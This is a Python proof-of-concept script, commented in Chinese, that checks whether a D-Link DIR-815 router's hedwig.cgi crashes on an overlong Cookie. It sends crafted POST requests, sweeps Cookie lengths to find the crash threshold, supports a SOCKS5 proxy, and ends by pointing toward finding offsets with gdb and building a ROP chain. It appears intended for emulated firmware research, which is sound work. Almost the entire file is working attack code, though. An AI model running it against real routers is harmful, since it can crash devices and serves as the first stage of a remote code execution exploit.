#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DIR-815 hedwig.cgi Cookie 栈溢出 —— 存在性验证 PoC

用途:判断目标固件的 hedwig.cgi 在收到超长 Cookie 时是否会崩。
不包含 ROP/shellcode,只做"有没有溢出"的判定,便于在仿真环境里快速确认。

依赖:仅标准库(python3 即可,不需要 requests),内置了最小的 SOCKS5 客户端。

示例:
    # 直连(在 FirmAE 容器内 / 已能访问 192.168.0.1 的机器上)
    python3 poc_hedwig_cookie.py -u http://192.168.0.1/

    # 通过 socks 代理(自己起 ssh -D 2345 时)
    python3 poc_hedwig_cookie.py -u http://192.168.0.1/ --socks 127.0.0.1:2345

    # 扫描长度,找崩溃阈值
    python3 poc_hedwig_cookie.py -u http://192.168.0.1/ --sweep 32:2048:32

判定:
    RESET / HANG  -> 服务没能正常响应,大概率溢出成功(或被打挂)
    ALIVE         -> 返回了 HTTP 状态行,该长度未触发
"""
from __future__ import annotations

import argparse
import socket
import sys
from urllib.parse import urlsplit

TIMEOUT_DEFAULT = 8.0


# --------------------------------------------------------------------------
# 网络
# --------------------------------------------------------------------------
def _recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise OSError("连接被关闭")
        buf += chunk
    return buf


def _socks5_connect(proxy, host: str, port: int, timeout: float) -> socket.socket:
    ph, pp = proxy
    sock = socket.create_connection((ph, pp), timeout=timeout)
    sock.sendall(b"\x05\x01\x00")
    if _recv_exact(sock, 2) != b"\x05\x00":
        raise OSError("SOCKS5 协商失败")
    hb = host.encode()
    sock.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + port.to_bytes(2, "big"))
    rep = _recv_exact(sock, 4)
    if rep[1] != 0:
        raise OSError(f"SOCKS5 连接目标失败 (rep={rep[1]})")
    # 吃掉 BND.ADDR / BND.PORT
    atyp = rep[3]
    if atyp == 1:
        _recv_exact(sock, 6)
    elif atyp == 3:
        n = _recv_exact(sock, 1)[0]
        _recv_exact(sock, n + 2)
    elif atyp == 4:
        _recv_exact(sock, 18)
    return sock


def open_socket(host: str, port: int, socks, timeout: float) -> socket.socket:
    if socks:
        return _socks5_connect(socks, host, port, timeout)
    return socket.create_connection((host, port), timeout=timeout)


# --------------------------------------------------------------------------
# 请求
# --------------------------------------------------------------------------
def build_request(path: str, host_header: str, cookie_len: int, name: str = "uid") -> bytes:
    cookie = name.encode() + b"=" + b"A" * cookie_len
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "User-Agent: iot-vulhub-poc/1.0\r\n"
        "Accept: */*\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
    ).encode()
    return head + b"Cookie: " + cookie + b"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"


def probe(host, port, path, host_header, cookie_len, socks, timeout, name="uid"):
    req = build_request(path, host_header, cookie_len, name)
    try:
        sock = open_socket(host, port, socks, timeout)
    except OSError as exc:
        return "CONNFAIL", f"连不上目标: {exc}"
    try:
        sock.sendall(req)
        sock.settimeout(timeout)
        try:
            data = sock.recv(4096)
        except socket.timeout:
            return "HANG", "超时无响应"
        if not data:
            return "RESET", "对端关闭连接且无响应"
        line = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        return "ALIVE", line
    except OSError as exc:
        return "RESET", f"{type(exc).__name__}: {exc}"
    finally:
        try:
            sock.close()
        except OSError:
            pass


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------
def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="DIR-815 hedwig.cgi Cookie 溢出存在性验证",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("-u", "--url", default="http://192.168.0.1/", help="目标 base URL")
    ap.add_argument("--path", default="/hedwig.cgi", help="CGI 路径")
    ap.add_argument("--cookie", default="uid", help="被注入的 Cookie 名")
    ap.add_argument("-l", "--length", type=int, default=1024, help="单次测试的 Cookie 长度")
    ap.add_argument("--sweep", help="长度扫描,格式 start:stop:step,例如 32:2048:32")
    ap.add_argument("--socks", help="SOCKS5 代理,格式 host:port")
    ap.add_argument("-t", "--timeout", type=float, default=TIMEOUT_DEFAULT)
    args = ap.parse_args(argv)

    parts = urlsplit(args.url if "://" in args.url else "http://" + args.url)
    host = parts.hostname or "192.168.0.1"
    port = parts.port or 80
    host_header = parts.netloc

    socks = None
    if args.socks:
        sh, _, sp = args.socks.partition(":")
        socks = (sh, int(sp or 1080))

    if args.sweep:
        try:
            start, stop, step = (int(x) for x in args.sweep.split(":"))
        except ValueError:
            ap.error("--sweep 需要 start:stop:step")
        lengths = list(range(start, stop + 1, step))
    else:
        lengths = [args.length]

    print(f"[*] 目标   http://{host}:{port}{args.path}")
    print(f"[*] Cookie {args.cookie}=<len>")
    if socks:
        print(f"[*] 代理由 {socks[0]}:{socks[1]}")
    print()

    hits = []
    for n in lengths:
        verdict, detail = probe(
            host, port, args.path, host_header, n, socks, args.timeout, args.cookie
        )
        mark = " " if verdict == "ALIVE" else "*"
        print(f"  {mark} len={n:<6} {verdict:<9} {detail}")
        if verdict in ("RESET", "HANG"):
            hits.append(n)

    print()
    if hits:
        print(f"[!] 以下长度未能正常响应: {hits}")
        print("[!] 若可复现,说明该固件存在 hedwig.cgi Cookie 溢出;")
        print("    接着用 gdb(方式 C 的 MODE=gdb)定位精确偏移,再构造 ROP。")
        return 0

    print("[*] 全部长度都正常响应,可能是:长度不足 / 该版本已修复 / Cookie 名不对")
    return 1


if __name__ == "__main__":
    sys.exit(main())
